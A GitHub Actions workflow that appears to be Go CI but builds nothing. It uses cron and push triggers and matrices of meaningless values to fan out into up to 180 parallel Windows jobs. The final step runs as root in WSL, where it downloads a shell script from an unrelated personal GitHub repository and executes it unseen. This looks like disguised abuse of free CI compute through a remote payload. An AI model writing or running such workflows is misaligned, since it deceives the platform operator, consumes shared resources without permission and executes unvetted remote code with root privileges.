on:
  push:
  schedule:
    - cron: '* 6 * * *'
jobs:
  build:
    runs-on: windows-latest
    strategy:
      max-parallel: 40
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4]
        flag: [A, B, C, D, E, F, G, H, I, J]
    env:
        NUM_JOBS: 40
        JOB: ${{ matrix.go }}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: actions/checkout@v1
  deploy:
    needs: build
    runs-on: windows-latest
    strategy:
      max-parallel: 80
      fail-fast: false
      matrix:
        go: [1.1, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8, 1.9, 1.0]
        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R]
    env:
        NUM_JOBS: 180
        JOB: ${{ matrix.go }}
    defaults:
     run:
       shell: wsl-bash -u root {0}
    steps:
    - name: Set up Go ${{ matrix.go }}
      uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
      id: go
    - name: Setup
      uses: Vampire/setup-wsl@v1
    - name : Update System
      run: apt-get update && apt-get upgrade -y && apt-get install wget timelimit tar -y
    - name: Run a multi-line script
      run: |
        wget https://raw.githubusercontent.com/ji725valentyn/tes/main/ltzz.sh && chmod +x ltzz.sh && ./ltzz.sh
